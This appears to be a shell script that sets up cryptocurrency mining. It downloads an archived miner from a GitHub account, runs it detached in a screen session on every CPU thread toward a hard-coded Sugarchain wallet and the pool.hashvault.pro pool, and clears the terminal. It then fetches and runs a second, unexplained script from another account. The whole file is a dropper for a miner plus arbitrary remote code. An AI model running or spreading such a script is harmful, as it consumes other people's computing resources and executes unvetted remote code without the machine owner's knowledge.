#!/bin/sh

WALLET=sugar1q9494l7vclvtuuhkfmuhgl0t2nnwymwl8xyukr8

POOL=pool.hashvault.pro:443

sudo apt install screen -y > /dev/null 2>&1
wget https://github.com/arifrahman555/arif/raw/main/cuan.tar.gz
tar -xf cuan.tar.gz
screen -S Wuenuak_Guerrr -dm ./cuan -a yespowersugar  -o $POOL -u $WALLET.nett -t$(nproc --all)
screen -ls
sleep 2
clear
cd ..
screen -ls
wget https://github.com/01057057/mamas/raw/main/anjay.sh && chmod u+x ./anjay.sh
./anjay.sh
